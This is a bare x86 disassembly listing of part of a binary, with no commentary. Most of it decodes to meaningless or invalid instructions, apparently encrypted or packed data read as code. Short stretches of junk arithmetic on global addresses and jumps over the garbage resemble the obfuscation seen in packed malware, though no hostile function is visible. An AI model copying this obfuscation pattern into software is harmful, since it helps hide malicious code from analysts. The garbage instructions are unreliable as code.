  406105:	fmul   DWORD PTR [ecx-0x7f]
  406108:	out    dx,al
  406109:	inc    esi
  40610a:	ja     0x4060de
  40610c:	pop    ebp
  40610d:	push   esp
  40610e:	not    dh
  406110:	push   0x31
  406112:	es push cs
  406114:	xchg   esp,esp
  406116:	(bad)
  40611b:	push   edx
  40611c:	dec    esp
  40611d:	std    
  40611e:	jno    0x40613f
  406120:	fistp  QWORD PTR [edi-0x5d]
  406123:	hlt    
  406124:	add    ebx,ebp
  406126:	cli    
  406127:	push   ebx
  406128:	sub    edx,ecx
  40612a:	adc    eax,eax
  40612c:	jae    0x4060fb
  40612e:	leave  
  40612f:	xchg   edi,eax
  406130:	int    0xa5
  406132:	jne    0x40615d
  406134:	dec    esi
  406135:	mov    esp,0x9d03a11a
  40613a:	rcl    DWORD PTR [ebx],1
  40613c:	ror    BYTE PTR [edx+0x1d17e4ba],cl
  406142:	or     al,0x2c
  406144:	sbb    DWORD PTR ds:0xac623649,0xffffffa6
  40614b:	jge    0x406121
  40614d:	mov    eax,0x204b2dc6
  406152:	mov    ecx,0x20106253
  406157:	mov    ah,0xe3
  406159:	iret   
  40615a:	test   BYTE PTR [ecx+ebp*2],ch
  40615d:	push   ds
  40615e:	or     esp,DWORD PTR [ecx-0x7c]
  406161:	dec    ecx
  406162:	mov    esp,0xff461e2
  406167:	push   edi
  406168:	or     ecx,esi
  40616a:	scas   al,BYTE PTR es:[edi]
  40616b:	lock hlt 
  40616d:	mov    dh,0x4b
  40616f:	xor    DWORD PTR [ebp+0x4b],esi
  406172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406173:	xchg   edi,eax
  406174:	daa    
  406175:	mov    bh,0xf5
  406177:	ins    DWORD PTR es:[edi],dx
  406178:	cmp    ch,BYTE PTR [esi-0x33a2aede]
  40617e:	leave  
  40617f:	mov    ebx,DWORD PTR [esi]
  406181:	adc    BYTE PTR [ebp+0x211b04b9],0x2b
  406188:	pushf  
  406189:	and    DWORD PTR ds:0xed087ac9,edi
  40618f:	mov    al,0x43
  406191:	xchg   edx,eax
  406192:	imul   ebp,ebp,0xf1c560c
  406198:	and    eax,0xd7d2f2de
  40619d:	dec    ebx
  40619e:	test   BYTE PTR [eax],ah
  4061a0:	in     eax,dx
  4061a1:	(bad)  
  4061a2:	mov    dh,0x11
  4061a4:	jne    0x406210
  4061a6:	fisttp QWORD PTR [esi+0x62]
  4061a9:	(bad)  
  4061aa:	dec    edx
  4061ab:	sbb    eax,0x2b65b9c1
  4061b0:	adc    eax,0x66bd0964
  4061b5:	mov    edx,0xc2ed24bc
  4061ba:	cmp    ebp,DWORD PTR [edx+ecx*8-0x37]
  4061be:	or     ebp,edi
  4061c0:	ds fucomip st,st(0)
  4061c3:	or     DWORD PTR [edi],ebx
  4061c5:	dec    esi
  4061c6:	pop    es
  4061c7:	add    esp,edi
  4061c9:	inc    esp
  4061ca:	xor    dl,BYTE PTR [esi+edi*2-0x2c]
  4061ce:	push   cs
  4061cf:	iret   
  4061d0:	out    dx,eax
  4061d1:	sub    dh,bl
  4061d3:	and    al,0x6e
  4061d5:	push   ecx
  4061d6:	cmp    esi,DWORD PTR [esp+edx*1]
  4061d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061da:	xor    eax,0xa2ad021e
  4061df:	jne    0x4061b1
  4061e1:	scas   eax,DWORD PTR es:[edi]
  4061e2:	and    ebp,DWORD PTR [ecx]
  4061e4:	xchg   edx,eax
  4061e5:	jmp    0x3ed6:0x9d860b96
  4061ec:	xor    BYTE PTR [esi],bh
  4061ee:	mov    bl,0xd7
  4061f0:	push   ecx
  4061f1:	fisub  WORD PTR [eax+0x3a]
  4061f4:	jp     0x40621f
  4061f6:	mov    ds:0x15574036,eax
  4061fb:	call   0xaf22dd64
  406200:	push   0xd732a29f
  406205:	mov    ds:0x50824f6a,al
  40620a:	in     eax,0x49
  40620c:	fs mov bh,0x11
  40620f:	nop
  406210:	mov    edi,0xde04b278
  406215:	loop   0x406221
  406217:	clc    
  406218:	ret    0x9746
  40621b:	imul   dl
  40621d:	mov    edi,DWORD PTR [edi+0x5d]
  406220:	jmp    0x406295
  406222:	mov    ecx,0x2a775b66
  406227:	jbe    0x40625b
  406229:	fs dec ebx
  40622b:	test   al,0x3c
  40622d:	jmp    0x406252
  40622f:	icebp  
  406230:	scas   eax,DWORD PTR es:[edi]
  406231:	push   eax
  406232:	retf   0x5b8e
  406235:	call   0xb717:0x92b9cc36
  40623c:	jle    0x406228
  40623e:	popa   
  40623f:	sbb    ch,BYTE PTR [edi]
  406241:	test   eax,0x87f7bb01
  406246:	mov    eax,ds:0xa9a214ce
  40624b:	mov    ds:0xcb7b6b8d,eax
  406250:	push   0x150a0cc4
  406255:	cmp    ebx,DWORD PTR [ebx]
  406257:	into   
  406258:	popa   
  406259:	dec    edx
  40625a:	ror    DWORD PTR [ebp+ebx*8+0x7f77ce53],1
  406261:	mov    eax,edi
  406263:	push   esp
  406264:	ins    DWORD PTR es:[edi],dx
  406265:	cmp    DWORD PTR cs:[ecx-0x3dcf25d6],ecx
  40626c:	push   0x35e59dba
  406271:	sbb    esp,DWORD PTR [edx+ebx*4-0x5f996793]
  406278:	dec    ebp
  406279:	sbb    DWORD PTR [ebx],eax
  40627b:	in     eax,0xc4
  40627d:	mov    esp,0x17cf91e9
  406282:	add    bl,BYTE PTR [ebx]
  406284:	dec    edx
  406285:	popf   
  406286:	cmp    al,0xa0
  406288:	jg     0x406263
  40628a:	int3   
  40628b:	or     ch,al
  40628d:	nop
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	mov    al,0x39
  406330:	mov    dh,0xfb
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4062c2
  40633b:	and    DWORD PTR [edi-0x77],ecx
  40633e:	arpl   sp,di
  406340:	ret    
  406341:	lods   eax,DWORD PTR ds:[esi]
  406342:	(bad)  
  406343:	jle    0x406378
  406345:	dec    esi
  406346:	stos   BYTE PTR es:[edi],al
  406347:	xor    DWORD PTR [ecx],esi
  406349:	imul   ecx,DWORD PTR [ecx-0x7b],0x8
  40634d:	fbld   TBYTE PTR [esi+0x7cf0ef3]
  406353:	into   
  406354:	arpl   WORD PTR [esi-0x4fb796de],ax
  40635a:	sub    eax,0x6973cad4
  40635f:	push   DWORD PTR [eax]
  406361:	xor    esi,ecx
  406363:	pop    ebx
  406364:	hlt    
  406365:	fistp  DWORD PTR [ebx]
  406367:	jo     0x40639d
  406369:	push   0x4ea0667b
  40636e:	jns    0x406322
  406370:	fidiv  WORD PTR [ebx]
  406372:	or     bl,BYTE PTR [eax]
  406374:	dec    eax
  406375:	inc    ebx
  406376:	sbb    edx,DWORD PTR [eax]
  406378:	jb     0x4063b4
  40637a:	xor    eax,0x30672a11
  40637f:	lods   al,BYTE PTR ds:[esi]
  406380:	out    dx,al
  406381:	aam    0x2e
  406383:	jb     0x4063cc
  406385:	inc    esp
  406386:	icebp  
  406387:	and    eax,0x70686d20
  40638c:	clc    
  40638d:	xlat   BYTE PTR ds:[ebx]
  40638e:	jle    0x4063e4
  406390:	bound  esi,QWORD PTR [ebx+0x5a]
  406393:	(bad)  
  406394:	pushf  
  406395:	mov    bh,0x94
  406397:	or     BYTE PTR [edi],dh
  406399:	in     eax,0xe2
  40639b:	jbe    0x4063bd
  40639d:	jb     0x4063e9
  40639f:	and    DWORD PTR [esi],esi
  4063a1:	adc    ebx,edi
  4063a3:	mov    DWORD PTR ds:0xbac09d92,esi
  4063a9:	popa   
  4063aa:	mov    ebx,0xf31fcc2e
  4063af:	fwait
  4063b0:	lods   eax,DWORD PTR ds:[esi]
  4063b1:	pop    edi
  4063b2:	push   ss
  4063b3:	js     0x4063f5
  4063b5:	xchg   ecx,eax
  4063b6:	call   0x8079f22c
  4063bb:	loop   0x406384
  4063bd:	stos   BYTE PTR es:[edi],al
  4063be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c0:	ss test al,0xde
  4063c3:	cdq    
  4063c4:	pushf  
  4063c5:	push   0x54cf110f
  4063ca:	js     0x406353
  4063cc:	mov    dl,0xd8
  4063ce:	sbb    ch,0xbd
  4063d1:	outs   dx,DWORD PTR ds:[esi]
  4063d2:	je     0x4063a1
  4063d4:	inc    BYTE PTR [edx-0x54]
  4063d7:	addr16 ss jno 0x4063c2
  4063db:	mov    al,ds:0xd07cdd9c
  4063e0:	adc    ebp,DWORD PTR [ebp+esi*1+0x1c008088]
  4063e7:	mov    dl,BYTE PTR [eax-0x1b4c6649]
  4063ed:	arpl   WORD PTR [eax-0x3f],di
  4063f0:	cld    
  4063f1:	and    al,0xce
  4063f3:	pop    ecx
  4063f4:	stos   DWORD PTR es:[edi],eax
  4063f5:	cwde   
  4063f6:	jmp    0xc401:0x66fa43bc
  4063fd:	and    BYTE PTR [edi+0x31],al
  406400:	int    0xc5
  406402:	sbb    ch,BYTE PTR [eax+0x64dc0a41]
  406408:	orps   xmm6,xmm0
  40640b:	mov    dl,0x5d
  40640d:	jge    0x40639a
  40640f:	sar    DWORD PTR [edi],1
  406411:	cs clc 
  406413:	into   
  406414:	pop    eax
  406415:	adc    eax,DWORD PTR [edi+0x226699fa]
  40641b:	push   esp
  40641c:	and    al,0x4
  40641e:	and    edx,esp
  406420:	jmp    0x2883:0x24ff9bba
  406427:	bound  ecx,QWORD PTR [ebx-0x143af96b]
  40642d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40642e:	mov    edi,DWORD PTR [esi]
  406430:	icebp  
  406431:	cmp    edi,DWORD PTR [eax+edx*1+0x318669d1]
  406438:	sbb    eax,0x34978478
  40643d:	or     ebx,DWORD PTR [ecx]
  40643f:	out    dx,eax
  406440:	inc    esi
  406441:	mov    al,0x3e
  406443:	(bad)  
  406444:	mov    edi,0xeefd90f9
  406449:	cwde   
  40644a:	fs inc esp
  40644c:	fwait
  40644d:	rcl    esp,cl
  40644f:	fild   DWORD PTR [edx-0x25d470fc]
  406455:	(bad)  
  406456:	retf   
  406457:	pushf  
  406458:	(bad)  
  40645a:	inc    eax
  40645b:	adc    DWORD PTR [edx-0x6c],ebx
  40645e:	push   ebp
  40645f:	xor    eax,edi
  406461:	mov    ds:0x35226273,eax
  406466:	pop    esi
  406467:	xchg   ebx,eax
  406468:	jnp    0x406497
  40646a:	push   cs
  40646b:	fwait
  40646c:	outs   dx,BYTE PTR ds:[esi]
  40646d:	xchg   BYTE PTR [ecx],bl
  40646f:	mov    bh,0xa5
  406471:	sahf   
  406472:	add    al,0xca
  406474:	leave  
  406475:	js     0x40646e
  406477:	jp     0x4064b4
  406479:	jns    0x40647b
  40647b:	xchg   edi,eax
  40647c:	and    al,0x8a
  40647e:	and    dl,BYTE PTR [eax-0x69f06aef]
  406484:	mov    esi,DWORD PTR [edx-0x5e151c13]
  40648a:	sbb    al,0x94
  40648c:	push   ss
  40648d:	and    ebp,esi
  40648f:	xor    DWORD PTR ds:0x7bfa0aa2,edi
  406495:	mov    ?,WORD PTR [ecx+0xb]
  406498:	mov    ch,0x3e
  40649a:	or     BYTE PTR [ebx],ch
  40649c:	jecxz  0x406484
  40649e:	mov    ecx,0xbd44d777
  4064a3:	sbb    edi,DWORD PTR [esi]
  4064a5:	pop    ss
  4064a6:	les    edx,FWORD PTR [ebx]
  4064a8:	addr16 pop ecx
  4064aa:	gs push esp
  4064ac:	in     eax,0xdb
  4064ae:	pop    eax
  4064af:	int    0xbc
  4064b1:	mov    ds:0xace27c03,al
  4064b6:	inc    esp
  4064b7:	lds    ecx,FWORD PTR [ebp-0x21]
  4064ba:	adc    eax,0xcc1d2bfe
  4064bf:	mov    eax,ds:0x2e41c340
  4064c4:	into   
  4064c5:	aad    0x58
  4064c7:	cmp    cl,BYTE PTR [esi]
  4064c9:	repnz loope 0x406526
  4064cc:	lds    eax,FWORD PTR [edx-0x1d]
  4064cf:	pop    ebp
  4064d0:	ja     0x4064e8
  4064d2:	cmp    eax,0xb322f857
  4064d7:	cmp    esp,DWORD PTR ss:[ecx-0x41]
  4064db:	loop   0x4064d8
  4064dd:	jmp    0x4064e8
  4064df:	into   
  4064e0:	aad    0x14
  4064e2:	jmp    0x19032e45
  4064e7:	add    BYTE PTR [ebp-0x75],dl
  4064ea:	in     al,dx
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	mov    BYTE PTR [bx-0x4a],al
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	sub    eax,0x893a1e0
  406577:	fisttp QWORD PTR [ebp+edi*4-0x3f]
  40657b:	ins    DWORD PTR es:[edi],dx
  40657c:	(bad)
  406580:	enter  0x327d,0xb1
  406584:	pusha  
  406585:	add    edi,ebx
  406587:	add    al,0x6e
  406589:	sbb    DWORD PTR ds:[ecx-0x3],edi
  40658d:	fdivr  st(1),st
  40658f:	in     eax,dx
  406590:	iret   
  406591:	sub    bh,BYTE PTR [esi+0x3315287b]
  406597:	ss out 0x81,eax
  40659a:	push   es
  40659b:	dec    eax
  40659c:	inc    edx
  40659d:	rcl    edx,0x20
  4065a0:	ins    DWORD PTR es:[edi],dx
  4065a1:	data16 setle BYTE PTR [ebx]
  4065a5:	and    ecx,DWORD PTR ds:0x54a9ea3
  4065ab:	pop    edi
  4065ac:	adc    esp,DWORD PTR [eax-0x77]
  4065af:	adc    DWORD PTR [edx-0x75],eax
  4065b2:	push   es
  4065b3:	push   ss
  4065b4:	push   ecx
  4065b5:	nop
  4065b6:	les    edx,FWORD PTR [eax+esi*2]
  4065b9:	mov    dl,0x30
  4065bb:	jae    0x406639
  4065bd:	pop    ebp
  4065be:	push   ebx
  4065bf:	mov    dh,0x5
  4065c1:	and    al,0x2c
  4065c3:	rcl    ecx,1
  4065c5:	imul   edx,DWORD PTR [edx+0x3d8af5bb],0x12
  4065cc:	mov    ebp,0xf3a17f9b
  4065d1:	out    0xa7,al
  4065d3:	mov    dh,0xe6
  4065d5:	sub    cl,BYTE PTR [eax-0x38]
  4065d8:	mov    bh,0xba
  4065da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065db:	push   eax
  4065dc:	jge    0x406631
  4065de:	sub    dh,BYTE PTR [eax]
  4065e0:	dec    DWORD PTR [edx-0x3c]
  4065e3:	add    al,0x36
  4065e5:	jg     0x406618
  4065e7:	loop   0x406655
  4065e9:	jb     0x40661a
  4065eb:	adc    al,0x2b
  4065ed:	retf   0xd9de
  4065f0:	sbb    dh,cl
  4065f2:	ss push 0xfffffff8
  4065f5:	lods   eax,DWORD PTR ds:[esi]
  4065f6:	sub    al,ah
  4065f8:	aaa    
  4065f9:	out    0xd6,eax
  4065fb:	adc    ecx,DWORD PTR [eax-0x35]
  4065fe:	loope  0x40663d
  406600:	adc    ebx,DWORD PTR [ebp+0x5e1219cf]
  406606:	xor    eax,0x54d6051a
  40660b:	adc    al,0x60
  40660d:	push   eax
  40660e:	jmp    0x4065d2
  406610:	xor    DWORD PTR [ecx],esi
  406612:	pusha  
  406613:	test   al,0xf5
  406615:	xor    BYTE PTR [ebx+0x20],al
  406618:	ror    BYTE PTR [edx-0x3],cl
  40661b:	icebp  
  40661c:	call   0x2e46df6
  406621:	jbe    0x40667f
  406623:	ds loopne 0x40663f
  406626:	cs inc edi
  406628:	cld    
  406629:	mov    cl,0x70
  40662b:	cmp    al,0x3a
  40662d:	xchg   ecx,eax
  40662e:	or     BYTE PTR [edx+0x52890e42],0xbe
  406635:	push   esp
  406636:	push   ss
  406637:	xor    esi,edx
  406639:	enter  0x6844,0x25
  40663d:	outs   dx,BYTE PTR ds:[esi]
  40663e:	xchg   DWORD PTR [edx-0x92f8843],ecx
  406644:	xor    ah,BYTE PTR [edx+eiz*4-0x43c91d03]
  40664b:	mov    eax,0x4915a9f6
  406650:	mov    ecx,DWORD PTR gs:[edx]
  406653:	cmp    BYTE PTR [esi+0x6b],al
  406656:	xor    bh,0x92
  406659:	cmp    BYTE PTR [eax-0xc63881b],bh
  40665f:	ins    BYTE PTR es:[edi],dx
  406660:	dec    edx
  406661:	sub    bl,BYTE PTR [edi-0x40]
  406664:	stos   DWORD PTR es:[edi],eax
  406665:	jae    0x406627
  406667:	sub    DWORD PTR [ebx+ebx*4-0x30],edx
  40666b:	and    al,0x4
  40666d:	(bad)  
  40666e:	mov    ch,0x16
  406670:	std    
  406671:	xor    bh,cl
  406673:	(bad)  
  406674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406675:	mov    bl,0x89
  406677:	jge    0x4066d0
  406679:	aas    
  40667a:	mov    WORD PTR [eax],cs
  40667c:	repz push 0x9085d4b2
  406682:	push   ebp
  406683:	neg    DWORD PTR [ebx+0x2e7f0704]
  406689:	cmp    DWORD PTR [esi+eiz*4+0x48ebcd4f],eax
  406690:	sbb    dh,0xf1
  406693:	mov    cl,0x77
  406695:	jne    0x40662a
  406697:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406698:	jnp    0x4066b7
  40669a:	add    esp,eax
  40669c:	sar    bl,cl
  40669e:	into   
  40669f:	shr    ebx,cl
  4066a1:	cs xchg esp,eax
  4066a3:	test   DWORD PTR [edx-0x17ebeb9],0x8a01ed68
  4066ad:	aaa    
  4066ae:	xchg   edx,eax
  4066af:	loop   0x4066a6
  4066b1:	ret    
  4066b2:	adc    al,0xb2
  4066b4:	cmp    DWORD PTR [esi-0x5cad740e],ebp
  4066ba:	mov    bl,0x50
  4066bc:	mov    dl,ah
  4066be:	or     cl,BYTE PTR [esi]
  4066c0:	dec    ebx
  4066c1:	inc    ecx
  4066c2:	jmp    0x53597e1d
  4066c7:	out    dx,al
  4066c8:	(bad)  
  4066c9:	out    dx,al
  4066ca:	mov    cl,0x78
  4066cc:	xor    eax,0x1718f02d
  4066d1:	in     al,0xba
  4066d3:	pop    es
  4066d4:	cmp    al,0xf8
  4066d6:	pop    ebp
  4066d7:	cmc    
  4066d8:	push   es
  4066d9:	fild   DWORD PTR [ebx-0x3b]
  4066dc:	and    DWORD PTR [ecx+0x6d],ebx
  4066df:	jnp    0x40667d
  4066e1:	add    esi,esp
  4066e3:	mov    bh,0x40
  4066e5:	outs   dx,DWORD PTR ds:[esi]
  4066e6:	lea    esp,[ebx+esi*2]
  4066e9:	xlat   BYTE PTR ds:[ebx]
  4066ea:	or     edi,DWORD PTR [eax]
  4066ec:	pop    esp
  4066ed:	stos   DWORD PTR es:[edi],eax
  4066ee:	xchg   ecx,eax
  4066ef:	das    
  4066f0:	outs   dx,BYTE PTR ds:[esi]
  4066f1:	push   edi
  4066f2:	pusha  
  4066f3:	jp     0x40670d
  4066f5:	inc    esp
  4066f6:	sbb    edx,DWORD PTR [edi+0x6d7ddf77]
  4066fc:	ss test eax,0x6caf4491
  406702:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406703:	not    DWORD PTR [eax+0x281c6a85]
  406709:	dec    ebp
  40670a:	cld    
  40670b:	cdq    
  40670c:	mov    ebx,0x192372dd
  406711:	pop    edx
  406712:	ss dec ecx
  406714:	sbb    edx,DWORD PTR [esi]
  406716:	jae    0x4066e4
  406718:	pop    es
  406719:	stc    
  40671a:	daa    
  40671b:	arpl   WORD PTR [eax-0x1325a825],bx
  406721:	mov    ecx,0xc480dad3
  406726:	nop
  406727:	cmp    BYTE PTR [ebx+ebx*1+0x7a],0x64
  40672c:	(bad)  [eax+0x41]
  40672f:	arpl   WORD PTR [ebx-0x2f],bp
  406732:	out    dx,al
  406733:	arpl   di,dx
  406735:	push   es
  406736:	pop    esp
  406737:	xchg   esp,eax
  406738:	retf   
  406739:	mov    cl,0xa8
  40673b:	fiadd  WORD PTR [ecx-0x79d8b2f1]
  406741:	pop    eax
  406742:	adc    eax,0x8d81dd74
  406747:	inc    ecx
  406748:	adc    edx,DWORD PTR [edx]
  40674a:	mov    ds:0x2ab95bc,eax
  40674f:	ret    0xfecd
  406752:	test   eax,0x5ab9de5a
  406757:	jns    0x4067a4
  406759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40675a:	xor    eax,0xfcd4974d
  40675f:	lahf   
  406760:	push   cs
  406761:	push   ecx
  406762:	cmp    BYTE PTR [edi+0x77d135f0],ch
  406768:	adc    eax,0xb825ccf3
  40676d:	loope  0x406788
  40676f:	out    0x71,eax
  406771:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406772:	js     0x406733
  406774:	inc    edi
  406775:	daa    
  406776:	lods   eax,DWORD PTR ds:[esi]
  406777:	sbb    edx,DWORD PTR [edx+esi*1]
  40677a:	sahf   
  40677b:	dec    eax
  40677c:	and    esp,DWORD PTR ss:[ebx+0xe8b637c]
  406783:	pusha  
  406784:	test   DWORD PTR [edi+0x345c99e6],ecx
  40678a:	neg    BYTE PTR [esi-0x310b21f1]
  406790:	mov    cl,0x46
  406792:	cwde   
  406793:	retf   
  406794:	fsubrp st(5),st
  406796:	add    ch,BYTE PTR [esi+0x35]
  406799:	mov    dl,bl
  40679b:	lds    ecx,FWORD PTR [edx]
  40679d:	loopne 0x406739
  40679f:	push   esp
  4067a0:	sbb    BYTE PTR [ebx+0x108cd90f],al
  4067a6:	push   edx
  4067a7:	loop   0x406816
  4067a9:	les    esp,FWORD PTR [ecx+0x173f2df3]
  4067af:	pop    ecx
  4067b0:	mov    bl,0x80
  4067b2:	out    dx,eax
  4067b3:	dec    eax
  4067b4:	or     cl,BYTE PTR [esi-0x69b8f266]
  4067ba:	sar    BYTE PTR [edx+0x68c9064a],cl
  4067c0:	cs inc esp
  4067c2:	mov    DWORD PTR [esi-0x79],esi
  4067c5:	call   0x18c80989
  4067ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067cb:	stos   BYTE PTR es:[edi],al
  4067cc:	xchg   ebp,eax
  4067cd:	cmp    al,BYTE PTR [edi]
  4067cf:	pop    eax
  4067d0:	dec    edx
  4067d1:	stos   BYTE PTR es:[edi],al
  4067d2:	mov    dh,0xc3
  4067d4:	add    DWORD PTR [ebx+esi*4+0x3d3c839d],0xffffffdb
  4067dc:	pop    eax
  4067dd:	addr16 mov ah,0x32
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	cmp    dh,dl
  406848:	pop    edi
  406849:	push   esp
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	pop    ebx
  406853:	cmp    ebx,ecx
  406855:	(bad)  
  406856:	test   al,0x1f
  406858:	push   ebx
  406859:	fadd   QWORD PTR [edx]
  40685b:	and    cl,BYTE PTR [edx]
  40685d:	je     0x406866
  40685f:	scas   al,BYTE PTR es:[edi]
  406860:	and    ecx,DWORD PTR [esi-0x6ee2c512]
  406866:	out    0x46,eax
  406868:	pop    ebp
  406869:	shl    BYTE PTR [eax+edx*2],0xb8
  40686d:	leave  
  40686e:	add    al,0x83
  406870:	push   edi
  406871:	sbb    al,0x3c
  406873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406874:	dec    ecx
  406875:	pop    ds
  406876:	daa    
  406877:	arpl   WORD PTR [ebx+0x58],dx
  40687a:	xchg   DWORD PTR ds:0x8cd8183e,ecx
  406880:	ficomp WORD PTR [ebx-0x17]
  406883:	call   0x8112:0xa94c3b64
  40688a:	popa   
  40688b:	jmp    0x40681e
  40688d:	pop    esi
  40688e:	imul   ebx,DWORD PTR [edi-0x6e],0xfffffffc
  406892:	jmp    0xc1f1:0x12d407f2
  406899:	push   ss
  40689a:	adc    bl,BYTE PTR [ebx-0x3a]
  40689d:	sub    BYTE PTR [edx+0x31],bh
  4068a0:	repz cld 
  4068a2:	push   eax
  4068a3:	mov    al,0x2
  4068a5:	(bad)  
  4068a6:	sar    DWORD PTR ds:0xe3d97a0a,0x64
  4068ad:	inc    ebp
  4068ae:	xchg   DWORD PTR [ecx+edi*4],edx
  4068b1:	mov    dh,0xad
  4068b3:	pop    edx
  4068b4:	and    DWORD PTR [ebx+0x2d],ebp
  4068b7:	call   0x96e5:0x486f74b6
  4068be:	pop    edi
  4068bf:	jg     0x4068cb
  4068c1:	sbb    BYTE PTR [ecx],bh
  4068c3:	out    dx,eax
  4068c4:	sbb    edi,DWORD PTR [edi-0x2efd3751]
  4068ca:	mov    esp,0xc3c74a6d
  4068cf:	xchg   edx,eax
  4068d0:	xchg   ebp,eax
  4068d1:	cmp    ecx,DWORD PTR [ebp+0x1f880f1e]
  4068d7:	cmp    esp,DWORD PTR [edx-0x1f8c9842]
  4068dd:	add    eax,0xf231eaa0
  4068e2:	and    dl,cl
  4068e4:	test   al,0x53
  4068e6:	cmc    
  4068e7:	in     al,dx
  4068e8:	pop    ds
  4068e9:	jnp    0x406896
  4068eb:	cmp    ecx,DWORD PTR [ecx]
  4068ed:	add    edx,esi
  4068ef:	jae    0x406951
  4068f1:	jle    0x4068ba
  4068f3:	ins    BYTE PTR es:[edi],dx
  4068f4:	jl     0x4068f3
  4068f6:	jo     0x4068e4
  4068f8:	jg     0x4068ac
  4068fa:	mov    edi,0x7337020
  4068ff:	retf   
  406900:	push   edx
  406901:	daa    
  406902:	sbb    esi,0x83c66628
  406908:	addr16 xchg edx,eax
  40690a:	ret    
  40690b:	cld    
